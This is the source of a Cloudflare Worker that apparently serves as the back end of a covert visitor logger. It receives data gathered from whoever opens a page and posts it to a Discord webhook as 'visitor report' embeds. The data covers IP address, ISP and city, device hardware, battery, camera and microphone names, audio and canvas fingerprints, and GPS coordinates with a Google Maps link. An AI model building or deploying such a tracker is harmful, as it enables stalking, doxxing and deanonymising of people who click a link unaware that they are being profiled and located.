/**
 * Cloudflare Worker — りっかちゃん ✦
 */

const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

// ── Helpers ──────────────────────────────────────────────

function s(v, max = 220) {
  if (v == null || v === "" || v === "null" || v === undefined) return "—";
  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").trim().slice(0, max);
}

function bool(v) {
  if (v === true  || v === "true")  return "Ya";
  if (v === false || v === "false") return "Tidak";
  return "—";
}

function arr(v) {
  if (!v || !Array.isArray(v) || v.length === 0) return "—";
  return v.join(", ").slice(0, 200) || "—";
}

function waktuWIB() {
  try {
    return new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      day: "2-digit", month: "long", year: "numeric",
      hour: "2-digit", minute: "2-digit", second: "2-digit",
    });
  } catch (_) { return new Date().toISOString(); }
}

function parseBrands(brandsJson) {
  try {
    return JSON.parse(brandsJson).map(b => `${b.brand} ${b.version}`).join(", ");
  } catch (_) { return s(brandsJson); }
}

// Baris kosong tipis antar section
const SPACER = { name: "\u200B", value: "\u200B", inline: false };

// Garis pemisah dekoratif sebagai header section
function section(icon, title) {
  return { name: `${icon}  ﹒ ${title}`, value: "⠀", inline: false };
}

// ── Embed Utama ──────────────────────────────────────────

function buildEmbed(data) {
  const mapsLink = (data.lat && data.lon)
    ? `[📍 Buka di Google Maps](https://maps.google.com/?q=${data.lat},${data.lon})`
    : null;

  const urlLine = data.url
    ? `[↗ ${s(data.url, 60)}](${data.url})`
    : "—";

  const refLine = data.referrer
    ? `[↗ ${s(data.referrer, 60)}](${data.referrer})`
    : "*Dibuka langsung — tidak ada referrer*";

  const fields = [

    // ╌╌╌ AKSES ╌╌╌
    {
      name: "🔗  Halaman yang Dibuka",
      value: urlLine,
      inline: false,
    },
    {
      name: "🪄  Sumber Kunjungan",
      value: refLine,
      inline: false,
    },

    SPACER,

    // ╌╌╌ JARINGAN ╌╌╌
    {
      name: "🌐  Jaringan & Lokasi IP",
      value: [
        `**IP Address** ｜ \`${s(data.ip)}\``,
        `**ISP / Org** ｜ ${s(data.isp)}`,
        `**Kota** ｜ ${s(data.city)}   **Region** ｜ ${s(data.region)}`,
        `**Negara** ｜ ${s(data.country)}   **ASN** ｜ ${s(data.asn)}`,
        `**Proxy** ｜ ${bool(data.proxy)}   **Hosting** ｜ ${bool(data.hosting)}`,
      ].join("\n"),
      inline: false,
    },
    {
      name: "📡  Koneksi",
      value: [
        `**Tipe** ｜ ${s(data.connectionType)}   **Efektif** ｜ ${s(data.effectiveConnection)}`,
        `**Downlink** ｜ ${s(data.downlink)} Mbps   **RTT** ｜ ${s(data.rtt)} ms`,
        `**Hemat Data** ｜ ${bool(data.saveData)}   **Online** ｜ ${bool(data.online)}`,
      ].join("\n"),
      inline: false,
    },

    SPACER,

    // ╌╌╌ PERANGKAT ╌╌╌
    {
      name: "💻  Perangkat",
      value: [
        `**CPU** ｜ \`${s(data.hardwareConcurrency)} core\`   **RAM** ｜ \`${s(data.deviceMemory)} GB\``,
        `**GPU** ｜ ${s(data.vendor)}`,
        `**Renderer** ｜ ${s(data.renderer, 120)}`,
        `**WebGL** ｜ ${s(data.version, 60)}`,
        `**Touch Points** ｜ ${s(data.maxTouchPoints)}   **WebGPU** ｜ ${bool(data.webgpu)}`,
      ].join("\n"),
      inline: false,
    },
    {
      name: "🖥️  Layar",
      value: [
        `**Resolusi** ｜ \`${s(data.width)} × ${s(data.height)}\`   **Pixel Ratio** ｜ \`${s(data.pixelRatio)}x\``,
        `**Tersedia** ｜ \`${s(data.availWidth)} × ${s(data.availHeight)}\`   **Color** ｜ \`${s(data.colorDepth)} bit\``,
        `**Viewport** ｜ \`${s(data.innerWidth)} × ${s(data.innerHeight)}\`   **Orientasi** ｜ ${s(data.orientation)}`,
      ].join("\n"),
      inline: false,
    },
    {
      name: "🔋  Baterai",
      value: [
        `**Level** ｜ ${s(data.level)}   **Charging** ｜ ${bool(data.charging)}`,
      ].join("\n"),
      inline: false,
    },

    SPACER,

    // ╌╌╌ SISTEM ╌╌╌
    {
      name: "🗂️  Sistem & Platform",
      value: [
        `**Platform** ｜ ${s(data.platform)}   **Mobile** ｜ ${bool(data.mobile)}`,
        `**Model** ｜ ${s(data.model)}   **Arch** ｜ ${s(data.architecture)} ${s(data.bitness) !== "—" ? `(${s(data.bitness)}-bit)` : ""}`,
        `**Browser** ｜ ${data.brands ? parseBrands(data.brands) : "—"}`,
      ].join("\n"),
      inline: false,
    },
    {
      name: "🌏  Bahasa & Waktu",
      value: [
        `**Bahasa** ｜ ${s(data.language)}   **Semua** ｜ ${s(data.languages, 80)}`,
        `**Timezone** ｜ ${s(data.timezone)}`,
        `**Kalender** ｜ ${s(data.calendar)}   **Mata Uang** ｜ ${s(data.currency)}`,
      ].join("\n"),
      inline: false,
    },

    SPACER,

    // ╌╌╌ SIDIK JARI ╌╌╌
    {
      name: "🎵  Fingerprint",
      value: [
        `**Audio**  ｜ \`${s(data.audioFingerprint, 80)}\``,
        `**Canvas** ｜ \`${s(data.canvasFingerprint, 80)}\``,
      ].join("\n"),
      inline: false,
    },

    SPACER,

    // ╌╌╌ STORAGE & MEDIA ╌╌╌
    {
      name: "💾  Penyimpanan Browser",
      value: [
        `**LocalStorage** ｜ ${bool(data.localStorage)}   **SessionStorage** ｜ ${bool(data.sessionStorage)}`,
        `**IndexedDB** ｜ ${bool(data.indexedDB)}   **ServiceWorker** ｜ ${bool(data.serviceWorker)}`,
        `**Cache API** ｜ ${bool(data.cacheAPI)}   **Cookies** ｜ ${s(data.cookies)}   **DNT** ｜ ${s(data.doNotTrack)}`,
      ].join("\n"),
      inline: false,
    },
    {
      name: "🎙️  Perangkat Media",
      value: [
        `**Mikrofon** ｜ ${arr(data.audioIn)}`,
        `**Kamera** ｜ ${arr(data.videoIn)}`,
        `**Speaker** ｜ ${arr(data.audioOut)}`,
      ].join("\n"),
      inline: false,
    },

    SPACER,

    // ╌╌╌ BROWSER ╌╌╌
    {
      name: "🧩  Kapabilitas Browser",
      value: [
        `WebGL2 ｜ ${bool(data.webgl2)}   WebRTC ｜ ${bool(data.webrtc)}   Fetch API ｜ ${bool(data.fetchAPI)}`,
        `CSS Grid ｜ ${bool(data.cssGrid)}   Flexbox ｜ ${bool(data.flexbox)}   Promise ｜ ${bool(data.promise)}`,
        data.plugins && data.plugins !== "—" ? `**Plugins** ｜ ${s(data.plugins, 120)}` : null,
      ].filter(Boolean).join("\n"),
      inline: false,
    },
    {
      name: "📋  User Agent",
      value: `\`\`\`\n${s(data.userAgent, 250)}\n\`\`\``,
      inline: false,
    },

  ];

  return {
    color: 0xFFB7D5,
    title: "✦  りっかちゃん  ✦  来訪者レポート",
    description: [
      "> *来訪者を発見しました — データの収集が完了しました。*",
      "> ─────────────────────────",
      `> **Waktu kunjungan** ｜ ${waktuWIB()}`,
    ].join("\n"),
    fields,
    footer: {
      text: "りっかちゃん  ✦  Visitor Intelligence  ✦  v2",
    },
    timestamp: new Date().toISOString(),
  };
}

// ── Embed GPS Follow-up ───────────────────────────────────

function buildGpsEmbed(data) {
  const mapsUrl = `https://maps.google.com/?q=${data.lat},${data.lon}`;
  return {
    color: 0xFFB7D5,
    title: "✦  りっかちゃん  ✦  ロケーション更新",
    description: [
      "> *来訪者が位置情報のアクセスを許可しました。*",
      "> ─────────────────────────",
      `> **Waktu** ｜ ${waktuWIB()}`,
    ].join("\n"),
    fields: [
      {
        name: "📍  Koordinat GPS",
        value: [
          `**Latitude** ｜ \`${data.lat}\``,
          `**Longitude** ｜ \`${data.lon}\``,
          `**Akurasi** ｜ ± ${data.accuracy ? Math.round(data.accuracy) + " meter" : "—"}`,
          ``,
          `[↗ Buka di Google Maps](${mapsUrl})`,
        ].join("\n"),
        inline: false,
      },
      {
        name: "🔗  Halaman",
        value: data.url ? `[↗ ${s(data.url, 80)}](${data.url})` : "—",
        inline: false,
      },
    ],
    footer: {
      text: "りっかちゃん  ✦  Visitor Intelligence  ✦  v2",
    },
    timestamp: new Date().toISOString(),
  };
}

// ── Handler ──────────────────────────────────────────────

export default {
  async fetch(request, env) {
    if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: CORS });
    if (request.method !== "POST")    return new Response("Not Found", { status: 404, headers: CORS });

    let data;
    try { data = await request.json(); }
    catch { return new Response("Bad JSON", { status: 400, headers: CORS }); }

    const webhook = env.DISCORD_WEBHOOK_URL;
    if (!webhook) return new Response("OK", { status: 200, headers: CORS });

    const embed = data._gpsOnly ? buildGpsEmbed(data) : buildEmbed(data);

    try {
      // Tidak menyertakan username/avatar_url — profil diambil dari pengaturan webhook Discord
      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] }),
      });
    } catch (e) { console.error(e); }

    return new Response("OK", { status: 200, headers: CORS });
  },
};
